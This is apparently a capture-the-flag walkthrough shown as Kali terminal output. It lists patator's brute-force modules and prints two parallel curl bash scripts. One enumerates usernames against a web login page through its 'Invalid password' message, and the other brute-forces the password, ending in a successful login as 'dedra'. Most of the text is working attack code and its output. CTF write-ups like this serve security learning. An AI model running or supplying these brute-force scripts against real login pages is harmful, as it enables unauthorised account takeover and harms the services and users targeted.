
user@kali:~/workspace$ patator -h
Patator v0.7 (https://github.com/lanjelot/patator)
Usage: patator module --help

Available modules:
  + ftp_login     : Brute-force FTP
  + ssh_login     : Brute-force SSH
  + telnet_login  : Brute-force Telnet
  + smtp_login    : Brute-force SMTP
  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
  + finger_lookup : Enumerate valid users using Finger
  + http_fuzz     : Brute-force HTTP
  + ajp_fuzz      : Brute-force AJP
  + pop_login     : Brute-force POP3
  + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)
  + imap_login    : Brute-force IMAP4
  + ldap_login    : Brute-force LDAP
  + smb_login     : Brute-force SMB
  + smb_lookupsid : Brute-force SMB SID-lookup
  + rlogin_login  : Brute-force rlogin
  + vmauthd_login : Brute-force VMware Authentication Daemon
  + mssql_login   : Brute-force MSSQL
  + oracle_login  : Brute-force Oracle
  + mysql_login   : Brute-force MySQL
  + mysql_query   : Brute-force MySQL queries
  + rdp_login     : Brute-force RDP (NLA)
  + pgsql_login   : Brute-force PostgreSQL
  + vnc_login     : Brute-force VNC
  + dns_forward   : Forward DNS lookup
  + dns_reverse   : Reverse DNS lookup
  + snmp_login    : Brute-force SNMP v1/2/3
  + ike_enum      : Enumerate IKE transforms
  + unzip_pass    : Brute-force the password of encrypted ZIP files
  + keystore_pass : Brute-force the password of Java keystore files
  + sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases
  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
  + tcp_fuzz      : Fuzz TCP services
  + dummy_test    : Testing module

user@kali:~/workspace$ cat pcurl_bruteforce_user.sh 
#!/bin/bash

login_page="http://34.74.105.127/771a84b0c0/login"
usernames=./usernames.txt # dictionary of possible usernames (simple list)
output_log=./petshop_pro_username_search.txt # output file
num_procs=8 # max number of jobs to spawn
num_jobs="\j" # The prompt escape for number of jobs currently running

for username in `cat ${usernames}`; do
  while (( ${num_jobs@P} >= ${num_procs} )); do
    wait -n
  done;
  echo $username | tee -a ${output_log};
  curl -s -X POST ${login_page} -d "username=$username&password=1" | grep "Invalid password" && echo "WINNER: $username" | tee -a 
${output_log} &
done

user@kali:~/workspace$ ./pcurl_bruteforce_user.sh
...

user@kali:~/workspace$ grep WINNER petshop_pro_username_search.txt 
WINNER: dedra

user@kali:~/workspace$ cat pcurl_bruteforce_pass.sh 
#!/bin/bash

login_page="http://34.74.105.127/771a84b0c0/login"
username=dedra
passwords=./passwords.txt # dictionary of possible passwords (simple list)
output_log=./petshop_pro_password_search.txt # output file
num_procs=8 # max number of jobs to spawn
num_jobs="\j" # The prompt escape for number of jobs currently running

echo "" > ${output_log}
for password in `cat ${passwords}`; do
  while (( ${num_jobs@P} >= ${num_procs} )); do
    wait -n
  done;
  echo $password | tee -a ${output_log};
  curl -s -X POST ${login_page} -d "username=$username&password=$password" | grep "Invalid password" &>/dev/null || echo "WINNER: 
$username $password" | tee -a ${output_log} &
done

user@kali:~/workspace$ ./pcurl_bruteforce_pass.sh 
...

That generated a number of false positives becase of the || statement.

user@kali:~/workspace$ grep WINNER petshop_pro_password_search.txt | wc -l
106

Let's send those back through the script again.

user@kali:~/workspace$ grep WINNER petshop_pro_password_search.txt | awk '{print $3}' > passwords.txt 
user@kali:~/workspace$ ./pcurl_bruteforce_pass.sh 
...
user@kali:~/workspace$ grep WINNER petshop_pro_password_search.txt
WINNER: dedra traci

Bingo.

user@kali:~/workspace$ curl -s X POST "http://34.74.105.127/771a84b0c0/login" -d "username=dedra&password=traci"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.



